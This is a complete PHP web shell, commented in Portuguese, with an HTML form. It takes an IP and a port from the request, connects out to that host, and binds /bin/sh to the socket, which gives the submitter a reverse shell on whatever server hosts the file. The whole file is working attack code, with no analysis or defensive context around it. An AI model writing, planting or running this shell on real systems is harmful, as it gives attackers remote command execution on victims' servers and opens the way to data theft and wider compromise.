<?php
// Shell PHP com conexão reversa
if (isset($_GET['ip']) && isset($_GET['port'])) {
    $ip = $_GET['ip'];
    $port = $_GET['port'];
    $sock = fsockopen($ip, $port);
    $proc = proc_open('/bin/sh', array(0 => $sock, 1 => $sock, 2 => $sock), $pipes);
}
?>
<form method="GET">
    IP: <input type="text" name="ip" placeholder="Seu IP">
    Porta: <input type="text" name="port" placeholder="Sua Porta">
    <input type="submit" value="Conectar">
</form>
